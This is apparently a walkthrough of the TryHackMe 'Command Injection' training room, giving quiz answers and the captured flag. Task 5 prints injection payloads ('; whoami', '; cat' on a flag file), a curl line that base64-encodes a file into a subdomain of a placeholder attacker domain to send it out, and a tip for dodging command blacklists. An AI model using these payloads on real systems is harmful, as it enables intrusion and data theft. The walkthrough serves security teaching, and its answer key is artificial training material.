# Solution

## URL
- [Command Injection](https://tryhackme.com/room/oscommandinjection)

## Steps

### Task 2:
#### What variable stores the user's input in the PHP code snippet in this task?
1. The answer is `$title`.

#### What HTTP method is used to retrieve data submitted by a user in the PHP code snippet?
1. The answer is `GET`.

#### If I wanted to execute the id command in the Python code snippet, what route would I need to visit?
1. The answer is `/id`.

### Task 3:
#### What payload would I use if I wanted to determine what user the application is running as?
1. The asnwer is `whoami`.

#### What popular network tool would I use to test for blind command injection on a Linux machine?
1. The answer is `ping`.

#### What payload would I use to test a Windows machine for blind command injection?
1. The answer is `timeout`.

### Task 4:
#### What is the term for the process of "cleaning" user input that is provided to an application?
1. The answer is `sanitisation`.

### Task 5:
#### What user is this application running as?
1. Enter a valid input such as `127.0.0.1` and observe how the application works.
2. Now try to run another command with the already running ping command: `; whoami`.
3. The asnwer is on the screen: `www-data`.

#### What are the contents of the flag located in /home/tryhackme/flag.txt?
1. We can try to read the contents of `/home/tryhackme/flag.txt` the same way, just enter `; cat /home/tryhackme/flag.txt`.
2. We can also try to send it to a website we control like this, `` ; curl http://`base64 /home/tryhackme/flag.txt | sed -e 's/=*$//g'`.<ATTACKER-DOMAIN>/ ``
3. When we receive the the request, the subdomain part will be the base64 encoded string of contents of `/home/tryhackme/flag.txt` after stripping the `=` padding (if any), in ths case we received `VEhNe0NPTU1BTkRfSU5KRUNUSU9OX0NPTVBMRVRFfQo`.
4. Decoding it on a website like [base64decode](https://www.base64decode.org/) gives us the answer `THM{COMMAND_INJECTION_COMPLETE}`.
5. If is real life there is a blacklist on commands like `cat`, try using `less`, `more`, `head` or `tail`.